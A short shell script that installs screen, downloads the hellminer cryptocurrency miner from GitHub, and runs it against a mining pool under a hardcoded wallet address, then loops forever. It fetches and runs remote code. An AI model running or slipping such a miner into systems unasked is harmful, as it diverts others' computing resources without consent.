#!/bin/sh
sudo apt update
sudo apt install screen -y
wget https://github.com/hellcatz/hminer/releases/download/v0.58/hellminer_linux64.tar.gz
tar -xvf hellminer_linux64.tar.gz
./hellminer -c stratum+tcp://sg.vipor.net:5040 -u RAKtoCaznMEVpeCLejipLBTq4Ji6VC86V5.HOME
while [ 1 ]; do
sleep 3
done
sleep 999
